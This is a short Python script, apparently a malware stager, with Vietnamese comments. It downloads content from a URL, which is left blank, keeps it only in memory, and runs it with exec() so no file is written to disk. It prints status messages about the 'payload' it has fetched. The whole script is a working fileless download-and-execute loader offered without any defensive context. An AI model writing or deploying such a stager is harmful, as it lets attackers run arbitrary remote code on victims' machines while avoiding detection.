import urllib.request

def run_stager(): 
    
    PAYLOAD_URL = ""
    
    try:
        #  Kéo dữ liệu từ Internet về (Chỉ đọc, không ghi file)
        req = urllib.request.Request(PAYLOAD_URL)
        response = urllib.request.urlopen(req)
        
        #  Đọc nội dung gói tin thành dạng Text lưu vào biến trong RAM
        memory_payload = response.read().decode('utf-8')
        print("[*] Payload fetched into RAM. Size:", len(memory_payload), "bytes")
         
        exec(memory_payload, globals())
        
    except Exception as e:
        print(f"[!] Transport error: {e}")

if __name__ == "__main__":
    run_stager()




